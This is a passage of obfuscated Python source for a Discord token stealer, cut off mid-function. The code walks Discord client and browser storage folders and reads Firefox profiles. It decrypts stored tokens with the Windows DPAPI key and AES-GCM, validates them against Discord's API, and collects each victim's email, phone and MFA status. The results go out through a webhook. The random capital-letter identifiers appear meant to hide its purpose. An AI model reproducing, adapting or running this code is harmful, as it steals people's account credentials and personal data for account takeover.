        CMBYHNRGIPECEQDFXUMBNSZIZRKKTWDYUBLOEUOFPPYKMZYESEPRGQAOIZVVBRIIKKBCWWNFMQRCCMCAJTYETMHL_enc = r"dQw4w9WgXcQ:[^\"]*"
        NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ = []
        WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF = []
        WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI = {}

        CSOTGVQRJJSXKNOSYUDNMDNGJVCUCKPAVDODKPOZOWWNBXLNVCOBXGVTUOKUILMXMXVMHMURWAXXASTDAB = {
            'Discord': QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': XJTRLRPAJJJYCZSONBXULDFSSGBGXYNFLBJYOBVZPZZNEWFQTKUDUAYVIFLWWGVZZEJJVDRHAIPZLOUIDTRI + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT, RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN in CSOTGVQRJJSXKNOSYUDNMDNGJVCUCKPAVDODKPOZOWWNBXLNVCOBXGVTUOKUILMXMXVMHMURWAXXASTDAB.items():
            if not os.path.exists(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
                continue
            DCSLQXMRCILAOJYNFUQLJVCSSNRXQFDIWMQWSBNKUPLUNBVFOUBM = DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT.replace(" ", "").lower()
            if "cord" in RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN:
                if not os.path.exists(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + f'\\{DCSLQXMRCILAOJYNFUQLJVCSSNRXQFDIWMQWSBNKUPLUNBVFOUBM}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(CMBYHNRGIPECEQDFXUMBNSZIZRKKTWDYUBLOEUOFPPYKMZYESEPRGQAOIZVVBRIIKKBCWWNFMQRCCMCAJTYETMHL_enc, v4r_line.strip()):
                                JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX = RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTLVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), PEYRCWERMSKUSHMMZYUBELJTTRQVIXCXVCURJHKLNTZARHSAIQLYEMDYVMCGNCNKDRWT(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + f'\\{DCSLQXMRCILAOJYNFUQLJVCSSNRXQFDIWMQWSBNKUPLUNBVFOUBM}\\Local State'))
                                if KNVYHPHDBXUCXMEAVTBMAJKYAFFMRUDZOYTRBMVPCRKJCODNYKJBLIMGBPKIBUBWWWZJYWLOUSNOTMPKFGQVQDIRMA(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX, OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV):
                                    XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ = requests.get(OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV, headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX}).json()['id']
                                    if XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ not in WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF:
                                        NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ.append(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX)
                                        WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF.append(XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ)
                                        WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI[JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX] = (DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT, f"{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX in re.findall(CMBYHNRGIPECEQDFXUMBNSZIZRKKTWDYUBLOEUOFPPYKMZYESEPRGQAOIZVVBRIIKKBCWWNFMQRCCMCAJTYETMHL, v4r_line.strip()):
                                if KNVYHPHDBXUCXMEAVTBMAJKYAFFMRUDZOYTRBMVPCRKJCODNYKJBLIMGBPKIBUBWWWZJYWLOUSNOTMPKFGQVQDIRMA(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX, OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV):
                                    XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ = requests.get(OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV, headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX}).json()['id']
                                    if XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ not in WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF:
                                        NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ.append(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX)
                                        WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF.append(XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ)
                                        WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI[JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX] = (DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT, f"{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\\{v4r_file_name}")

        if os.path.exists(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + "\\Mozilla\\Firefox\\Profiles"):
            for RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN, _, v4r_files in os.walk(QICGRCDOFNDIALYVNCBUVYPSMZMBNSPZIFRTBVDDGJGFOHWEOLTTWTACUSKKVMFIUFSISRKOYZOGFKFAVY + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX in re.findall(CMBYHNRGIPECEQDFXUMBNSZIZRKKTWDYUBLOEUOFPPYKMZYESEPRGQAOIZVVBRIIKKBCWWNFMQRCCMCAJTYETMHL, v4r_line.strip()):
                                    if KNVYHPHDBXUCXMEAVTBMAJKYAFFMRUDZOYTRBMVPCRKJCODNYKJBLIMGBPKIBUBWWWZJYWLOUSNOTMPKFGQVQDIRMA(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX, OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV):
                                        XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ = requests.get(OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV, headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX}).json()['id']
                                        if XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ not in WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF:
                                            NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ.append(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX)
                                            WWNRVQZWTZRVOXRWOIZUXOJDITGKOTLQKHQTCHOMMMDVVDRNTCECTOPAJJZTOJGGDYKJOBWGWZTHDSDCMLDRDF.append(XCGWKYJJZIOICRCIFFFSGWZQVHBMQCYEWXJIQDXFSHPQBNTEZNPXQOFUYSHEDXPPUJ)
                                            WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI[JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX] = ('Firefox', f"{RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN}\\{v4r__file}")
        return NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ, WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI

    def KNVYHPHDBXUCXMEAVTBMAJKYAFFMRUDZOYTRBMVPCRKJCODNYKJBLIMGBPKIBUBWWWZJYWLOUSNOTMPKFGQVQDIRMA(JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX, OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV):
        return requests.get(OBBDVQXKGJIXBHLVJOCPRYEHKAXIPQVIBYVMBBZMASKJFLUXIFDWOASPRUZLFVLBMLPVUOERMZXAFNYFAOV, headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX}).status_code == 200

    def RSODLEXREZDWTKEPIXCLEYGNALIJNMLBLSUROHQMMGZTRRUEHSUGPFSIHKGZFOTJOQSTLVal(AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ, EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS):
        SGUWMJOBRUSBMKVJHRRQDFBSBHZBNALZYOYZBXBUXNNPJNNINHKGEHAZXEWFKIPBNLZSPUNUMBYOZRPPGOUBFBMSXZVMZ = AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ[3:15]
        XYMGHHHVMCEPRJOKSRDGMCGSMUZBFRTOPHMLPMHIPOIWLDEWTEGDZPCKVIJ = AKLDGWCZRLLISKXBOPPQOZXJSGCSZPFWHEKWXIEXAMWAAEKOVUHCDEQCNOMGHZZLRBVXDKDELANUKRUEVLRGEZ[15:]
        CVSKSLNEDMPJYNODEATOMYXAHOKQGCDVPYSORBGRNIXWDSCPHRKMXSJUMXRZQUAFZETIYMLHINZPOBISVSIB = AES.new(EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS, AES.MODE_GCM, SGUWMJOBRUSBMKVJHRRQDFBSBHZBNALZYOYZBXBUXNNPJNNINHKGEHAZXEWFKIPBNLZSPUNUMBYOZRPPGOUBFBMSXZVMZ)
        return CVSKSLNEDMPJYNODEATOMYXAHOKQGCDVPYSORBGRNIXWDSCPHRKMXSJUMXRZQUAFZETIYMLHINZPOBISVSIB.decrypt(XYMGHHHVMCEPRJOKSRDGMCGSMUZBFRTOPHMLPMHIPOIWLDEWTEGDZPCKVIJ)[:-16].decode()

    def PEYRCWERMSKUSHMMZYUBELJTTRQVIXCXVCURJHKLNTZARHSAIQLYEMDYVMCGNCNKDRWT(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
        if not os.path.exists(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN):
            return None
        with open(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN, "r", encoding="utf-8") as v4r_f:
            WICRGABGVMRDCNKWBCNHLLSYMFKOUNMFFHOMUBOXEZALBNSGQVDEAYLXBMAAPGGQOHCMLVMPA = json.load(v4r_f)
        EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS = base64.b64decode(WICRGABGVMRDCNKWBCNHLLSYMFKOUNMFFHOMUBOXEZALBNSGQVDEAYLXBMAAPGGQOHCMLVMPA["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(EWLMDVZDZEZCQTDUATHJSSJFFITUZEEOTIZCBOQMMNJZMDCMZCSRGEUUYAZYLESRZGLS, None, None, None, 0)[1]

    NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ, WANEGCJHCJOECWDGQPKQUZPKAFHFFIXEXAPLIXGJRJXNEVPQAUUYUPGYHLOFPTHIJSZPAYEBGGEYI = SOGKZURQNCIHTLVYXLJMYTLYRJVEPXZDTBUMYLXFZFWPWRMSDBVZOFMDEK()
    CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK = SyncWebhook.from_url(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)

    if not NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ:
        HHNDDPEDUIPODFIEGZPKTOMSYWFILBPGDXPURXRKOSXXDXKNAVCDQSMCXDFKFRJFRXEXQTEICHUWGGKTRQDWLBRKOJCKSZL(
            RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, 
            title=f'Discord Token {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:', 
            description=f"No discord tokens found."
        )
        return
    
    for JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX_d15c0rd in NOWSPEUTEUCNHGCLAQCMFZRHLXQNODVMJBHPAIFMSNTGAVZOROMIWOJEGYXZOTIDLQDJXUMCQXDOQ:
        RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': JCEYOTYXCZKDVJIKJGVZDNIVVRASPYYAXVCHTIYUCTSTJTQYJGZYOZQDERIKSNVMQDFQAJBLFVQYUKYTX_d15c0rd}).json()

        IDCCALMTNFKMLHMDMNECOZSDJUMDNTPVYPGPPYZRBWPZLKUCMEJXUZVCISVAIZKYQXLUEDAPZRIGGHLW = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('username', "None") + '#' + RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('discriminator', "None")
        HCWRPVFCZJQJRHUKHKUCKDVQHZWJRJWELIYJUKDKSFBJNVCQCBCUVFBGJZJAUGTMRKSUUQDKYVFZUANPRWKH = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('global_name', "None")
        SBJZTTFSAYUONJVHFBEZNGECVHBYIGAEWAAITXOPBQOVKQTGOFXYKHATVUISNQOIIDPQJC = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('id', "None")
        IJMRRYPLCUIYAXTXLVPUIMBWMQJAEJSFAQAAVIIVJTPVXRFVPGA = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('email', "None")
        LVOSKUFDBCCILTRJPSOSQGTPFMLZUYNJEEISQCJGZWSFSTMGAVSMJOLDLMJBJMDNWA = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('verified', "None")
        NOZPFADDCVFWARKVKZHIMAXYFGUJBEILWGGCSNYBVXZXMDUGTHELKDHNGCQNA = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('phone', "None")
        XDECAVDSAKUKDUCXWFUUZGDXOPNBRQLIQTBCZRJLBSGNRFIDTNDGITKWWPFUMRBXGSDPWGCWOGRJY = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('locale', "None")
        RBMDXKNLOMXMRBTUAFFRXQACGFSRNFYXKCMBJXVPDGBAQBQEKRHVZLBQEBYNIFYMFBJHMLQZMDD = RWJBOTNMFSHBWVLRFNBWRQBFSNSSIXMCNYTJUOXMAOYUHEEUXLBDSFRBAJUFBYYDVTCAAAVVRSTNWEFRQVMGMRGQBRRJLHOHRGW.get('mfa_enabled', "None")

        try:
